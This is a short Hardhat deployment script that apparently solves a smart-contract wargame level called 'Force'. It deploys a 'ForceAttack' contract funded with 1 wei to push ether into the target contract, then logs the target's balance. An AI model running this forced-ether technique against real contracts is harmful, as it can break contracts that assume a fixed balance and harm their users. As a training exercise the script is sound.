import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xCDf5F7dfd18b9A7D668d2BcA5CdCAA64565c321A"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Force", CONTRACT_ADDRESS, signer)

    const ForceAttackContract = await ethers.getContractFactory("ForceAttack")
    const forceAttackContract = await ForceAttackContract.deploy(contract.address, {
        // from: signer,
        value: 1, 
    })
    await forceAttackContract.deployed()
    const contractBalance = await contract.provider.getBalance(contract.address)
    console.log("new balance: ", contractBalance);
    
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});